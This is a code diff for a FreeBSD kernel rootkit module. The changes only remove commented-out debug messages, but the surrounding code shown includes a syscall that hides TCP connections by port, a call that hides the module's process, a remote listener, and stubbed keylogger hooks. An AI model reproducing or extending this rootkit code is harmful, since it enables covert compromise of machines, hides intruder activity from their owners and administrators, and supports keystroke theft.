@@ -222,9 +222,6 @@ port_hiding(struct thread *td, void *syscall_args) {
     INP_INFO_WLOCK(&V_tcbinfo);
 
     CK_LIST_FOREACH(inpb, &V_tcbinfo.ipi_listhead, inp_list){
-        // if (inpb->inp_vflag & INP_TIMEWAIT) {
-        //     continue;
-        // }
         INP_RLOCK(inpb);
         if (ntohs(inpb->inp_lport) == uap->port || 
             ntohs(inpb->inp_fport) == uap->port
@@ -360,24 +357,12 @@ static int load(module_t module, int cmd, void *arg) {
             // 	init_keylogger(); TODO: Fix this later
             if (error == 0) {
                 hide_process(p->p_pid);
-                // printf("rootkit: module loaded & remote listener active\n");
             } else {
-                // printf("rootkit: device created, failed to start listener (%d)\n", error);
             }
         } else {
             rk_log_uninit();
-            // printf("rootkit: failed to create device (%d)\n", error);
         }
 
-
-
-        // if (error == 0)
-        //     printf("rootkit: module loaded\n");
-        /* TODO: Fix this later
-            // if error == 0 {
-            // 	init_keylogger();
-            // }
-        */
 		// only be initial when device is successfully created
         break;
 
@@ -397,7 +382,6 @@ static int load(module_t module, int cmd, void *arg) {
         cv_broadcast(&remote_cv);
         mtx_unlock(&remote_mtx);
 
-        // cleanup_keylogger();     TODO: Fix this later
 
         cv_destroy(&remote_cv);
         mtx_destroy(&remote_mtx);
